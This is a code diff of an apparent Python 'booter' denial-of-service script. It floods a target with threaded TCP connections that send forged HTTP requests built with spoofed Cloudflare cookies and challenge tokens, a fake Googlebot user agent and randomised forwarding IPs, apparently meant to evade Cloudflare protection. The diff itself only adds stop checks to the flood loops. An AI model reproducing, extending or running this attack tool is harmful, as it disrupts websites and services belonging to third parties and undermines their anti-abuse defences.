@@ -1,5 +1,5 @@
 import socket,ssl,threading,struct,datetime,random,string
-from MODEL.data import get_target,gen_id,generate_url_path,gen_ips,same_random
+from MODEL.data import get_target,gen_id,generate_url_path,gen_ips,same_random,read
 
 def datetime_to_epoch():
     date_string = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -8,8 +8,10 @@ def datetime_to_epoch():
 
 def CONNECT_SEND(s,byt,target):
    for _ in range(2500):
+    if read() == True:break
     try:
      for _ in range(250):
+       if read() == True:break
        s.sendall(byt[0]); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
        s.sendall(byt[1]); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
      s.shutdown(socket.SHUT_RDWR); s.close()
@@ -19,8 +21,10 @@ def CONNECT_SEND(s,byt,target):
 
 def CONNECT(target,duration_sec_attack_dude,byt):
     for _ in range(int(duration_sec_attack_dude)):
+        if read() == True:break
         try:
             for _ in range(500):
+             if read() == True:break
              s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
              s.connect((str(target['host']),int(target['port'])))
              s.connect_ex((str(target['host']),int(target['port'])))
@@ -61,5 +65,7 @@ for _ in range(int(thread_lower)):
        elif mode_uam == 6:type_c = '__cf_chl_jschl_tk__'
        link = 'https://'+url.replace('https://','').replace('http://','').replace('/','')+f"/?{type_c}={generate_url_path(string=string_abc+'_',num=43)}-{datetime_to_epoch()}-{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}-{generate_url_path(string='0123456789',num=4)}"
    byt = [f"{meth_http} {a} HTTP/1.1\r\nHost: {target['host']}\r\nCDN-Loop: cloudflare\r\n{head[0]}{head[1]}{head[2]}{head[3]}CF-Worker: {gen_ips()}/*\r\nReferer: {link}\r\nCookie: _cfuvid={generate_url_path(string=string_abc+'_.',num=43)}-{datetime_to_epoch()}-{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}-{generate_url_path(string='0123456789',num=random.randint(1,999999))}; __cflb={generate_url_path(string=string_abc,num=43)}; __cf_bm={generate_url_path(string=string_abc+'_',num=random.randint(1,18))}.{generate_url_path(string=string_abc,num=random.randint(1,24))}-{datetime_to_epoch()}-{random.choice(('1','0'))}.{random.choice(('1','0'))}.{random.choice(('1','0'))}.{random.choice(('1','0'))}-{generate_url_path(string=string_abc+'_',num=random.randint(1,84))}; _ga_{generate_url_path(string=string_abc,num=4)}=GS1.1.{datetime_to_epoch()}.4.1.{datetime_to_epoch()}.0.0.0; _gid=GA1.2.{generate_url_path(string='0123456789',num=9)}.{datetime_to_epoch()}; __cfduid={generate_url_path(string='abcdefghijklmnopqrstuvwxyz0123456789',num=43)}; cf_clearance={generate_url_path(string=string_abc,num=random.randint(1,21))}.{generate_url_path(string=string_abc+'_',num=random.randint(1,21))}-{datetime_to_epoch()}-{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}.{random.choice(('0','1'))}-{generate_url_path(string=string_abc+'_',num=random.randint(1,61))}.{generate_url_path(string=string_abc+'_',num=random.randint(1,22))}.{generate_url_path(string=string_abc+'_',num=random.randint(1,85))}; PHPSESSID={gen_id(15)}; _ym_uid={generate_url_path(string='0123456789',num=19)}; _ym_d={generate_url_path(string='0123456789',num=10)}; _ym_isad={generate_url_path(string='0123456789',num=1)}; \r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html), {useragent}\r\nConnection: keep-alive, upgrade\r\nKeep-Alive: timeout=1, max=9999999\r\nX-Forwarded-Host: {target['host']}\r\nX-Forwarded-Proto: https\r\nX-Forwarded-For: {', '.join([gen_ips() for _ in range(4)])}\r\nForwarded: by={gen_ips()};for={gen_ips()};host={target['host']};proto=https\r\n{head[6]}{head[7]}{head[8]}{head[9]}{head[10]}{head[11]}Upgrade: HTTP/1.0, HTTP/1.2, HTTP/1.3, HTTP/2, HTTP/3, HTTPS, HTTP\r\n\r\n".encode() for a in [target['uri'],f'/{generate_url_path(num=num)}']]
-   for _ in range(10):threading.Thread(target=CONNECT,args=(target,time_booter,byt)).start()
+   for _ in range(10):
+       if read() == True:break
+       threading.Thread(target=CONNECT,args=(target,time_booter,byt)).start()
    num += 1
